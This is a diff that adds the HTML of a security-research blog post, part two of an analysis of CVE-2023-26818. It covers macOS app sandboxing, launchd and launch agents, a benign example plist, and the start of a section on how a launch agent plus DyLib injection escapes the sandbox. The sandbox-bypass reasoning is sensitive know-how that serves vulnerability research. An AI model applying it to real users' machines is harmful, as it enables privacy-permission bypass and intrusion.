@@ -1,0 +1,1313 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>CVE-2023-26818 Part 2 (Sandbox): MacOS TCC Bypass W/ telegram using DyLib Injection - Zeyad Azima</title>
+<meta name="description" content="In 2nd part of the analysis for CVE-2023-26818, We discussing the app sandboxing in MacOS and show how to bypass it. To exploit the vulnerability. ">
+
+
+  <meta name="author" content="Zeyad Azima">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Zeyad Azima">
+<meta property="og:title" content="CVE-2023-26818 Part 2 (Sandbox): MacOS TCC Bypass W/ telegram using DyLib Injection">
+<meta property="og:url" content="http://localhost:5000/macos/CVE_2023_26818_P2/">
+
+
+  <meta property="og:description" content="In 2nd part of the analysis for CVE-2023-26818, We discussing the app sandboxing in MacOS and show how to bypass it. To exploit the vulnerability. ">
+
+
+
+  <meta property="og:image" content="http://localhost:5000/assets/images/cllu5qweb68631hoh6isz7uax.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-08-29T00:00:00+08:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:5000/macos/CVE_2023_26818_P2/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Zeyad Azima",
+      "url": "http://localhost:5000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Zeyad Azima Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/site_data/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/site_data/favicon-16x16.png">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/site_data/logo.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          Zeyad Azima
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/#Security-Research">Security Research</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#MacOS">MacOS</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#IoT-Exploitation">IoT Exploitation</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#Defense-Evasion">Defense Evasion</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#General">General</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/#Certificates">Certificates</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories">All Categories</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/site_data/avatar.jpg" alt="Zeyad Azima" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Zeyad Azima</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Brain Storming Stuff (Exploit Development, Reverse Engineering &amp; More)</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="mailto:contact@zeyadazima.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/AzimaZeyad" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/zer0verflow/" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/Zeyad-Azima" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://www.buymeacoffee.com/zeyadazima" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i><span class="label">Buy Me a Coffee</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="CVE-2023-26818 Part 2 (Sandbox): MacOS TCC Bypass W/ telegram using DyLib Injection">
+    <meta itemprop="description" content="Introduction">
+    <meta itemprop="datePublished" content="2023-08-29T00:00:00+08:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">CVE-2023-26818 Part 2 (Sandbox): MacOS TCC Bypass W/ telegram using DyLib Injection
+</h1>
+          
+            <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  16 minute read
+
+</p>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#introduction">Introduction</a></li>
+  <li><a href="#app-sandboxing">App sandboxing</a></li>
+  <li><a href="#launch-agent-and-bypass-the-sandbox">Launch Agent and Bypass the sandbox</a>
+    <ul>
+      <li><a href="#creating-a-launch-agent">Creating a Launch Agent</a></li>
+      <li><a href="#sandbox-bypass">Sandbox Bypass</a></li>
+    </ul>
+  </li>
+  <li><a href="#exploitation">Exploitation</a></li>
+  <li><a href="#conclusion">Conclusion</a></li>
+  <li><a href="#resources">Resources</a></li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="introduction"><strong>Introduction</strong></h1>
+
+<p>In the previous part we discuss the root-cause of the vulnerability and show case on how it works and how to exploit it. But,</p>
+
+<p>in the previous part the sandbox was disabled. Now, In this part 2 we are going to discuss the sandboxing on the <code class="language-plaintext highlighter-rouge">MacOS</code> and</p>
+
+<p>How to bypass it in details. If you didn’t read part 1 you can find it from <a href="https://zeyadazima.com/macos/CVE_2023_26818_P1/">here</a>.</p>
+
+<p> </p>
+
+<h1 id="app-sandboxing"><strong>App sandboxing</strong></h1>
+
+<p>The app sandboxing feature in <code class="language-plaintext highlighter-rouge">MacOS</code> is a technology that the system enforce at the kernel’s level which limit privileges and</p>
+
+<p>restrict the app access to resources/permissions. As a results, It helps in reducing the attacks and the infection of</p>
+
+<p>compromised apps to the system. The first introduce for the sandboxing by apple was in 2007 &amp; Enforced to be used by apps</p>
+
+<p>before adding it to the app store in 2011, So it make sure that the apps more secure to use by making the app run in it’s own</p>
+
+<p>area and do nothing more except what is created for.</p>
+
+<p> </p>
+
+<p> </p>
+
+<p><img src="/assets/images/9010354daa7a32ae23cba81f042665bd" alt="" /></p>
+
+<p> </p>
+
+<p>But, Why It’s important?. Because, any non-sandboxed app has the full rights of the user who is running that app, and can</p>
+
+<p>access any resources that the user can access. If that app or the frameworks it is linked against contain security holes, an</p>
+
+<p>attacker can potentially exploit those holes to take control of that app, and in doing so, the attacker gains the ability to</p>
+
+<p>do anything that the user can do on the system. So, Sandboxing the app helps to limit the infection of compromise and the</p>
+
+<p>attack surface for the malicious actor. So, To go more deeper how does the sandbox works and/or implemented ?. When the app</p>
+
+<p>is sandboxed it’s defined in the <code class="language-plaintext highlighter-rouge">Entitlements</code> which we discussed in the first part. The <code class="language-plaintext highlighter-rouge">Entitlement</code> of the sandbox is</p>
+
+<p><code class="language-plaintext highlighter-rouge">com.apple.security.app-sandbox</code>. The app sandbox has elements and these elements are container directories, entitlements,</p>
+
+<p>user-determined permissions, privilege separation, and kernel enforcement. Each App Sandboxed runs under a container created at</p>
+
+<p><code class="language-plaintext highlighter-rouge">~/Library/Containers/</code> under this path, you can find each sandboxed app with its <code class="language-plaintext highlighter-rouge">CFBundleIdentifier</code> as a folder and this</p>
+
+<p>folder contains a <code class="language-plaintext highlighter-rouge">plist</code> file and a <code class="language-plaintext highlighter-rouge">Sandbox profile data</code> file that contains the configuration of the sandboxed app like it’s</p>
+
+<p><code class="language-plaintext highlighter-rouge">Entitlements</code>. When you apply sandboxing to your app, On the first launch of your app <code class="language-plaintext highlighter-rouge">MacOS</code> Creates a special directory</p>
+
+<p>under the user that using it specifically the home directory in the <code class="language-plaintext highlighter-rouge">~/Library/Containers/</code> and the app has unfettered</p>
+
+<p>read/write access to the container for the user who ran it. Now, The question is how the app integrates with the system when needed.</p>
+
+<p> </p>
+
+<p> </p>
+
+<p><img src="/assets/images/d0ef078a57857815e067fd12b352633c" alt="" /></p>
+
+<p> </p>
+
+<p>Well, Let’s take the <code class="language-plaintext highlighter-rouge">Open</code> &amp; <code class="language-plaintext highlighter-rouge">Save</code> permissions as an example and suppose that the app wants to open and save something into</p>
+
+<p>any directory, What will happen is that the app will interact with the <code class="language-plaintext highlighter-rouge">Powerbox</code> API which is an internal part of <code class="language-plaintext highlighter-rouge">MacOS</code> and</p>
+
+<p>mainly associated with the sandboxing mechanism which is responsible for allowing sandboxed applications to request access to</p>
+
+<p>specific user files or resources without giving the application unrestricted access to the entire filesystem. And for more</p>
+
+<p>clearness it works as the following: Let’s say a sandboxed app wants to open a user file. The app cannot directly access the</p>
+
+<p>filesystem due to its sandbox restrictions, The app will present a file dialog to the user (like <code class="language-plaintext highlighter-rouge">NSOpenPanel</code> or <code class="language-plaintext highlighter-rouge">NSSavePanel</code></p>
+
+<p>in <code class="language-plaintext highlighter-rouge">MacOS</code>). When the user uses this dialog to select a file, they’re indirectly interacting with <code class="language-plaintext highlighter-rouge">Powerbox</code> and Once the user</p>
+
+<p>selects a file <code class="language-plaintext highlighter-rouge">Powerbox</code> grants the app a token (<code class="language-plaintext highlighter-rouge">or an exception to its sandbox</code>) to access only that specific file. After</p>
+
+<p>that the app doesn’t get unrestricted access to the whole filesystem but just the user-selected file. Finally, With the</p>
+
+<p>user’s explicit permission through the <code class="language-plaintext highlighter-rouge">Powerbox</code> system, sandboxed apps can also retain access to specific resources across</p>
+
+<p>launches using “<code class="language-plaintext highlighter-rouge">security-scoped bookmarks</code>.” for example, a sandboxed text editor to save changes back to a file that a user</p>
+
+<p>has previously opened. So, In general the sandboxing feature in <code class="language-plaintext highlighter-rouge">MacOS</code> limit the following types of operations: <code class="language-plaintext highlighter-rouge">File read,</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">write, with many different granular operations</code>, <code class="language-plaintext highlighter-rouge">IPC</code> <code class="language-plaintext highlighter-rouge">Posix</code> and <code class="language-plaintext highlighter-rouge">SysV</code>, <code class="language-plaintext highlighter-rouge">Mach</code>, <code class="language-plaintext highlighter-rouge">Network</code> as <code class="language-plaintext highlighter-rouge">inbound</code> &amp; <code class="language-plaintext highlighter-rouge">outbound</code>, Process</p>
+
+<p><code class="language-plaintext highlighter-rouge">execution</code> &amp; <code class="language-plaintext highlighter-rouge">fork</code>, <code class="language-plaintext highlighter-rouge">Signals</code>, <code class="language-plaintext highlighter-rouge">Sysctl</code> and <code class="language-plaintext highlighter-rouge">System</code>. When an application is sandboxed and gets started it first calls</p>
+
+<p><code class="language-plaintext highlighter-rouge">sandbox_init</code> which will place the process into a sandbox using one of the pre-defined profiles. What are the profiles?</p>
+
+<p>The sandbox profiles are the set of rules which how the app behaves. example on the sandbox profiles:</p>
+
+<p> </p>
+
+<p> </p>
+
+<p><img src="/assets/images/38de653a3d3b19f5ccd8910e99d2bb04" alt="" /></p>
+
+<p> </p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">kSBXProfileNoInternet</code>: TCP/IP networking is prohibited.</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">kSBXProfileNoNetwork</code>: All sockets-based networking is prohibited.</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">kSBXProfileNoWrite</code>: File system writes are prohibited.</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">kSBXProfileNoWriteExceptTemporary</code>: File system writes are restricted to the temporary folder /var/tmp and the folder</p>
+
+    <p> </p>
+
+    <p>specified by theconfstr(3) configuration variable <code class="language-plaintext highlighter-rouge">_CS_DARWIN_USER_TEMP_DIR</code>.</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">kSBXProfilePureComputation</code>: All operating system services are prohibited.</p>
+
+    <p>Now, We have the basic knowledge about the app sandboxing, how it works and some of its components. Let’s move further.</p>
+  </li>
+</ul>
+
+<p> </p>
+
+<h1 id="launch-agent-and-bypass-the-sandbox"><strong>Launch Agent and Bypass the sandbox</strong></h1>
+
+<p>Now we come to bypass the sandbox but before we do tho we need to understand what is the <code class="language-plaintext highlighter-rouge">launchd</code> and <code class="language-plaintext highlighter-rouge">launch agent</code>.</p>
+
+<p><code class="language-plaintext highlighter-rouge">Launched</code> is a unified service-management framework initialy relased in <code class="language-plaintext highlighter-rouge">2005</code> which is responsible for starting, stopping, and</p>
+
+<p>managing daemons (<code class="language-plaintext highlighter-rouge">daemons</code> are the background process), applications, processes, and scripts, both at system startup and</p>
+
+<p>during the regular operation of the system. But, What does <code class="language-plaintext highlighter-rouge">unified</code> framework means ?, It means that <code class="language-plaintext highlighter-rouge">Launched</code> replaces</p>
+
+<p>several other <code class="language-plaintext highlighter-rouge">Unix</code> based service-management utilities and scripts that were traditionally used in older versions of macOS</p>
+
+<p>such as <code class="language-plaintext highlighter-rouge">init</code>, <code class="language-plaintext highlighter-rouge">rc</code>, <code class="language-plaintext highlighter-rouge">StartupItems</code>, <code class="language-plaintext highlighter-rouge">inetd</code>, <code class="language-plaintext highlighter-rouge">xinetd</code>, <code class="language-plaintext highlighter-rouge">cron</code>, and <code class="language-plaintext highlighter-rouge">at</code>. There is more than one type for the background processes</p>
+
+<p>(<code class="language-plaintext highlighter-rouge">daemons</code>), So the user can choose the one that fits its own requirements, considering the following:</p>
+
+<ul>
+  <li>
+    <p>Whether it does something for the currently logged in user or for all users.</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>Whether it will be used by a single application or by multiple applications.</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>Whether it ever needs to display a user interface or launch a GUI application.</p>
+  </li>
+</ul>
+
+<p> </p>
+
+<p>the background processes (<code class="language-plaintext highlighter-rouge">daemons</code>) has many types as the following:</p>
+
+<p> </p>
+
+<p> </p>
+
+<p><img src="/assets/images/37cc1d9da261814cc7aa6c1ffee7e2ce" alt="" /></p>
+
+<p> </p>
+
+<p>Each type is used for a spasific job and run in different context. But, the one we are intreasted in is <code class="language-plaintext highlighter-rouge">Launch Agent</code>, We</p>
+
+<p>discussed the <code class="language-plaintext highlighter-rouge">Launch Agent</code> before in the first part and we gonna talk about it again:</p>
+
+<p>A <code class="language-plaintext highlighter-rouge">Launch Agent</code> in <code class="language-plaintext highlighter-rouge">MacOS</code> is a tool designed for managing, scheduling, and executing background tasks. Part of the broader</p>
+
+<p>Launchd system, this mechanism takes charge of initiating, halting, and overseeing processes during different phases of the</p>
+
+<p>system’s operation and startup. Configuration files situated in specific folders guide the operation of daemons and agents</p>
+
+<p>managed by <code class="language-plaintext highlighter-rouge">launchd</code>. While these agents are supervised by <code class="language-plaintext highlighter-rouge">launchd</code>, their operations cater to the requirements of the</p>
+
+<p>currently active user, implying they function within the user context. Such agents possess the capability to engage in</p>
+
+<p>communication with other processes present in the identical user session, as well as with universal daemons in the</p>
+
+<p>overarching system context. Even though they have the capacity to exhibit a visual interface, it’s typically discouraged. For</p>
+
+<p>developers offering both services exclusive to users and those that aren’t, the dual incorporation of a daemon and an agent</p>
+
+<p>is a viable strategy. In such setups, the <code class="language-plaintext highlighter-rouge">daemon</code>, operating within the system context, extends the non-user-specific</p>
+
+<p>services. Concurrently, for each active user session, an instance of the agent is <code class="language-plaintext highlighter-rouge">launched</code>. These agents then collaborate</p>
+
+<p>with the daemon, ensuring seamless service provision to every user. The following are the directories of the <code class="language-plaintext highlighter-rouge">Launch Agents</code>:</p>
+
+<p> </p>
+
+<p> </p>
+
+<p><img src="/assets/images/9b278f75989b242621866cd8707dc951" alt="" /></p>
+
+<p> </p>
+
+<p>When talking about <code class="language-plaintext highlighter-rouge">launchd</code>, there are two primary session contexts to be aware of:</p>
+
+<p> </p>
+
+<p> </p>
+
+<p><img src="/assets/images/58f90f264a6846b3a0a35a2a25953b2f" alt="" /></p>
+
+<p> </p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Startup Session</code>:</p>
+
+    <p> </p>
+
+    <ul>
+      <li>
+        <p>This is the session context that starts when the system boots up, even before any user logs in. Daemons that run within</p>
+
+        <p> </p>
+
+        <p>the startup session context has system-wide permissions. They operate in the background, not associated with any</p>
+
+        <p> </p>
+
+        <p>specific user, and generally provide services that need to be available from the moment the system starts. These</p>
+
+        <p> </p>
+
+        <p>daemons run without any user interface, and they don’t have access to user-specific services or data unless they</p>
+
+        <p> </p>
+
+        <p>explicitly request and are granted such access. The configuration files for these daemons are usually found in <code class="language-plaintext highlighter-rouge">/Library/LaunchDaemons/</code> and <code class="language-plaintext highlighter-rouge">/System/Library/LaunchDaemons/</code>.</p>
+      </li>
+    </ul>
+
+    <p> </p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">Login Session</code>:</p>
+
+    <p> </p>
+
+    <ul>
+      <li>
+        <p>This session starts when a user logs into the system. Each user who logs in gets their own login session. Agents run</p>
+
+        <p> </p>
+
+        <p>within this context operate on behalf of the logged-in user and can access user-specific services, data, and even GUI</p>
+
+        <p> </p>
+
+        <p>elements if necessary. However, as they run with the permissions of the logged-in user, which means they can’t</p>
+
+        <p> </p>
+
+        <p>typically perform system-wide operations unless the user has elevated privileges. The configuration files for these</p>
+
+        <p> </p>
+
+        <p>agents can be found in <code class="language-plaintext highlighter-rouge">~/Library/LaunchAgents/</code> for user-specific agents and <code class="language-plaintext highlighter-rouge">/Library/LaunchAgents/</code> for agents that</p>
+
+        <p> </p>
+
+        <p>should be available to any user who logs in, but still run in the context of the logged-in user.</p>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<p> </p>
+
+<p>Now, Let’s see how is the startup for each session is done:</p>
+
+<ul>
+  <li>
+    <p>After the system is booted and the kernel is running, launchd is run to finish the system initialization. As part of that</p>
+
+    <p> </p>
+
+    <p>initialization, it goes through the following steps:</p>
+
+    <ol>
+      <li>
+        <p>It loads the parameters for each launch-on-demand system-level daemon from the property list files found in <code class="language-plaintext highlighter-rouge">/System/Library/LaunchDaemons/</code> and <code class="language-plaintext highlighter-rouge">/Library/LaunchDaemons/</code>.</p>
+
+        <p> </p>
+      </li>
+      <li>
+        <p>It registers the sockets and file descriptors requested by those daemons.</p>
+
+        <p> </p>
+      </li>
+      <li>
+        <p>It launches any daemons that requested to be running all the time.</p>
+
+        <p> </p>
+      </li>
+      <li>
+        <p>As requests for a particular service arrive, it launches the corresponding daemon and passes the request to it.</p>
+
+        <p> </p>
+      </li>
+      <li>
+        <p>When the system shuts down, it sends a <code class="language-plaintext highlighter-rouge">SIGTERM</code> signal to all of the daemons that it started.</p>
+      </li>
+    </ol>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>The process for per-user agents is similar. When a user logs in, a per-user launchd is started. It does the following:</p>
+
+    <p> </p>
+
+    <ol>
+      <li>
+        <p>It loads the parameters for each launch-on-demand user agent from the property list files found in <code class="language-plaintext highlighter-rouge">/System/Library/LaunchAgents</code>, <code class="language-plaintext highlighter-rouge">/Library/LaunchAgents</code>, and the user’s individual <code class="language-plaintext highlighter-rouge">~/Library/LaunchAgents</code> directory.</p>
+
+        <p> </p>
+      </li>
+      <li>
+        <p>It registers the sockets and file descriptors requested by those user agents.</p>
+
+        <p> </p>
+      </li>
+      <li>
+        <p>It launches any user agents that requested to be running all the time.</p>
+
+        <p> </p>
+      </li>
+      <li>
+        <p>As requests for a particular service arrive, it launches the corresponding user agent and passes the request to it.</p>
+
+        <p> </p>
+      </li>
+      <li>
+        <p>When the user logs out, it sends a <code class="language-plaintext highlighter-rouge">SIGTERM</code> signal to all of the user agents that it started.</p>
+      </li>
+    </ol>
+  </li>
+</ul>
+
+<p> </p>
+
+<h2 id="creating-a-launch-agent"><strong>Creating a Launch Agent</strong></h2>
+
+<p>When creating a <code class="language-plaintext highlighter-rouge">Launch Agent</code> we configure it in Property List(<code class="language-plaintext highlighter-rouge">plist</code>) file in <code class="language-plaintext highlighter-rouge">XML</code> format. The property list file is</p>
+
+<p>structured the same for both <code class="language-plaintext highlighter-rouge">daemons</code> and agents. You indicate whether it describes a <code class="language-plaintext highlighter-rouge">daemon</code> or agent by the directory you</p>
+
+<p>place it in. Property list files describing daemons are installed in <code class="language-plaintext highlighter-rouge">/Library/LaunchDaemons</code>, and those describing agents are</p>
+
+<p>installed in <code class="language-plaintext highlighter-rouge">/Library/LaunchAgents</code> or in the <code class="language-plaintext highlighter-rouge">LaunchAgents</code> subdirectory of an individual user’s Library directory. The</p>
+
+<p>needed keys in the <code class="language-plaintext highlighter-rouge">plist</code> file as the following:</p>
+
+<p> </p>
+
+<p> </p>
+
+<p><img src="/assets/images/988ba61969c123f9388fa677561cb239" alt="" /></p>
+
+<p> </p>
+
+<p>We can see in the above picture each <code class="language-plaintext highlighter-rouge">key</code> and its description. Now, an example of the agent:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
+&lt;plist version="1.0"&gt;
+&lt;dict&gt;
+    &lt;key&gt;Label&lt;/key&gt;
+    &lt;string&gt;com.example.hello&lt;/string&gt;
+    &lt;key&gt;ProgramArguments&lt;/key&gt;
+    &lt;array&gt;
+        &lt;string&gt;hello&lt;/string&gt;
+        &lt;string&gt;world&lt;/string&gt;
+    &lt;/array&gt;
+    &lt;key&gt;KeepAlive&lt;/key&gt;
+    &lt;true/&gt;
+&lt;/dict&gt;
+&lt;/plist&gt;
+</code></pre></div></div>
+
+<p> </p>
+
+<p>Let’s explain this example <code class="language-plaintext highlighter-rouge">plist</code> file:</p>
+
+<p> </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
+</code></pre></div></div>
+
+<p> </p>
+
+<p>This portion indicates that the file is an <code class="language-plaintext highlighter-rouge">XML</code> document and specifies the version of XML being used. The <code class="language-plaintext highlighter-rouge">DOCTYPE</code></p>
+
+<p>declaration defines the document type and references a <code class="language-plaintext highlighter-rouge">DTD</code> (<code class="language-plaintext highlighter-rouge">Document Type Definition</code>) from <code class="language-plaintext highlighter-rouge">Apple</code> which sets rules for the</p>
+
+<p><code class="language-plaintext highlighter-rouge">plist</code> file structure.</p>
+
+<p> </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;plist version="1.0"&gt;
+&lt;dict&gt;
+</code></pre></div></div>
+
+<p> </p>
+
+<p>These tags indicate the start of the plist content and a dictionary data structure. The dictionary will contain key-value</p>
+
+<p>pairs that define the properties and settings of the launch agent.</p>
+
+<p> </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;key&gt;Label&lt;/key&gt;
+&lt;string&gt;com.example.hello&lt;/string&gt;
+</code></pre></div></div>
+
+<p> </p>
+
+<p>This key-value pair assigns a unique identifier to the launch agent. This label, <code class="language-plaintext highlighter-rouge">com.example.hello</code>, is used by <code class="language-plaintext highlighter-rouge">launchctl</code></p>
+
+<p>(the command-line interface to <code class="language-plaintext highlighter-rouge">launchd</code>) to reference the agent for tasks like loading or unloading it.</p>
+
+<p> </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;key&gt;ProgramArguments&lt;/key&gt;
+&lt;array&gt;
+    &lt;string&gt;hello&lt;/string&gt;
+    &lt;string&gt;world&lt;/string&gt;
+&lt;/array&gt;
+</code></pre></div></div>
+
+<p> </p>
+
+<p>This key specifies the program to be executed along with its arguments. In this case, the program named <code class="language-plaintext highlighter-rouge">hello</code> will be run</p>
+
+<p>with the argument <code class="language-plaintext highlighter-rouge">world</code>. The path to the <code class="language-plaintext highlighter-rouge">hello</code> program is not specified here, so it would need to be in a location</p>
+
+<p>recognized by the system’s <code class="language-plaintext highlighter-rouge">PATH</code> or the full path should be provided.</p>
+
+<p> </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;key&gt;KeepAlive&lt;/key&gt;
+&lt;true/&gt;
+</code></pre></div></div>
+
+<p> </p>
+
+<p>This key-value pair indicates that the program should be kept running indefinitely. If the program exits for any reason,</p>
+
+<p><code class="language-plaintext highlighter-rouge">launchd</code> will restart it. The value <code class="language-plaintext highlighter-rouge">&lt;true/&gt;</code> means that the <code class="language-plaintext highlighter-rouge">KeepAlive</code> feature is enabled.</p>
+
+<p> </p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;/dict&gt;
+&lt;/plist&gt;
+</code></pre></div></div>
+
+<p> </p>
+
+<p>These mark the end of the dictionary data structure and the end of the <code class="language-plaintext highlighter-rouge">plist</code> content.</p>
+
+<p> </p>
+
+<h2 id="sandbox-bypass"><strong>Sandbox Bypass</strong></h2>
+
+<p>After going through dozens of resources non-mentioned the root-cause or the reason why the <code class="language-plaintext highlighter-rouge">launch agent</code> can bypass the</p>
+
+<p>sandbox. But, I found 2 reasons that are closer to being true and one of them makes more sense:</p>
+
+<p> </p>
+
+<ul>
+  <li>
+    <p>When the app runs through <code class="language-plaintext highlighter-rouge">launchd</code> then it’s managed by <code class="language-plaintext highlighter-rouge">launchd</code> and works under it, As a result, it bypasses the sandbox.</p>
+
+    <p> </p>
+  </li>
+  <li>
+    <p>When a malicious code such as a <code class="language-plaintext highlighter-rouge">DyLib</code> gets loaded with the program in the agent, It leads the library to act the same way</p>
+
+    <p> </p>
+
+    <p>as the program. Then it will be able to obtain the same permissions as the running app which makes it bypass the sandbox.</p>
+  </li>
+</ul>
